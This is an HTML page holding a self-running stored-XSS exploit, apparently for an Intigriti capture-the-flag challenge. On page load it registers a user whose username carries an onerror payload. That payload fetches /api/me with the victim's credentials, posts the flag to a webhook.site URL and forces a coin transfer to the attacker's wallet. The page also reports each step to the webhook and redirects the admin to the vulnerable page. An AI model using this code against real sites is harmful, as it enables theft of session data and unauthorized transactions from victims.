<!DOCTYPE html>
<html>
<head>
    <title>XSS Test</title>
    <meta charset="UTF-8">
    <style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;} h1{color:#0f0;text-align:center;} #log{background:#111;padding:15px;border:1px solid #333;margin:20px 0;font-size:11px;max-height:400px;overflow-y:auto;} .success{color:#0f0;} .error{color:#f00;} .info{color:#0ff;} .warning{color:#ff0;}</style>
</head>
<body>
    <h1>XSS Test - Username as Nickname</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/d87d2d91-53b8-4517-be2b-3ad069e7ab34';

        const XSS_USERNAME = `xss_test_${Date.now()}&lt;img src=x onerror=&quot;
            (async () => {
                const meResp = await fetch('/api/me', {credentials: 'include'});
                const meData = await meResp.json();
                await fetch('${WEBHOOK}', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        flag: meData.flag,
                        source: 'username_nickname_xss'
                    })
                });
                await fetch('/api/transaction', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: '${OUR_WALLET}',
                        currency: '1337COIN',
                        amount: 1
                    })
                });
                alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));
            })();
        &quot;&gt;`;

        let step = 0;

        function log(msg, type = 'info') {
            step++;
            const ts = new Date().toLocaleTimeString();
            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg}</div>`;
            console.log(`[${step}] ${msg}`);

            new Image().src = `${WEBHOOK}/?step=${step}&msg=${encodeURIComponent(msg)}&type=${type}&ts=${Date.now()}`;
        }

        async function exploit() {
            try {
                log('Step 1: Registering with XSS username...');

                const regResp = await fetch(TARGET + '/api/register', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: XSS_USERNAME,
                        password: 'TestPass123!'
                    })
                });

                const regData = await regResp.json();
                log(`Registration: ${regResp.status} - ${JSON.stringify(regData)}`, regResp.ok ? 'success' : 'error');

                if (!regResp.ok) {
                    log('Registration failed - trying login only', 'warning');
                }

                log('Step 2: Logging in with XSS user...');

                const loginResp = await fetch(TARGET + '/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        username: XSS_USERNAME,
                        password: 'TestPass123!'
                    })
                });

                const loginData = await loginResp.json();
                log(`Login: ${loginResp.status} - ${JSON.stringify(loginData)}`, loginResp.ok ? 'success' : 'error');

                if (!loginResp.ok) {
                    log('Login failed!', 'error');
                    return;
                }

                log('Step 3: Making transaction (will have our username as nickname)...');

                const txResp = await fetch(TARGET + '/api/transaction', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    })
                });

                const txData = await txResp.json();
                log(`Transaction: ${txResp.status} - ${JSON.stringify(txData)}`, txResp.ok ? 'success' : 'error');

                log('Step 4: Redirecting admin to marketwatch...', 'warning');
                log('XSS should execute when admin views our transaction!', 'warning');

                // Redirect to marketwatch after 2 seconds
                setTimeout(() => {
                    window.location.href = TARGET + '/marketwatch.html';
                }, 2000);

            } catch (error) {
                log(`ERROR: ${error.message}`, 'error');
            }
        }

        window.addEventListener('load', () => {
            log('Page loaded, starting exploit...', 'info');
            setTimeout(exploit, 500);
        });
    </script>
</body>
</html>
